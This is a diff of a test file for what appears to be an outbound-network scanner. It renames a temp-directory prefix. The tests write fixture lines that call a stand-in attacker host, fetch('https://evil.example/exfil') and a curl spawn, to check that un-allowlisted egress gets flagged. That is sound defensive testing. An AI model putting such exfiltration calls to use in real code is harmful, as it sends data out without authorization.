@@ -35,7 +35,7 @@ test('33.5-04: real shipped tree passes the gate', () => {
 });
 
 test('33.5-04: an un-allowlisted egress is flagged', () => {
-  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gdd-outbound-'));
+  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'hone-outbound-'));
   const evil = path.join(tmpDir, 'evil.cjs');
   try {
     fs.writeFileSync(evil, "const r = await fetch('https://evil.example/exfil');\n", 'utf8');
@@ -50,7 +50,7 @@ test('33.5-04: an un-allowlisted egress is flagged', () => {
 });
 
 test('33.5-04: a commented-out call is not a false-positive', () => {
-  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gdd-outbound-'));
+  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'hone-outbound-'));
   const commented = path.join(tmpDir, 'commented.cjs');
   try {
     fs.writeFileSync(
@@ -67,7 +67,7 @@ test('33.5-04: a commented-out call is not a false-positive', () => {
 });
 
 test('33.5-04: scanOutbound exposes findings shape + exit-code contract', () => {
-  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gdd-outbound-'));
+  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'hone-outbound-'));
   const evil = path.join(tmpDir, 'spawn-evil.cjs');
   try {
     fs.writeFileSync(evil, "spawnSync('curl', ['https://evil.example']);\n", 'utf8');
